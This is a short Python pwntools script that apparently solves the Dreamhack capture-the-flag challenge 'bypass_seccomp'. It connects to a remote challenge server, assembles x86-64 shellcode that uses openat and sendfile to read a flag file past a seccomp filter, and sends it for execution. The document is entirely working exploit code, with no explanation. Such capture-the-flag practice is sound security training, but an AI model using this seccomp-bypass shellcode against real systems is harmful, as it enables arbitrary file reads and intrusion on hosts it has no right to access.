from pwn import *

context(arch="x86_64", os="linux")
# p = process("./bypass_seccomp")
p = remote("host3.dreamhack.games", 16453)

payload = shellcraft.openat(0, "/home/bypass_seccomp/flag")
payload += shellcraft.sendfile(1, 'rax', 0, 0xff) 
payload += shellcraft.exit(0) 

p.sendline(asm(payload))
p.interactive()
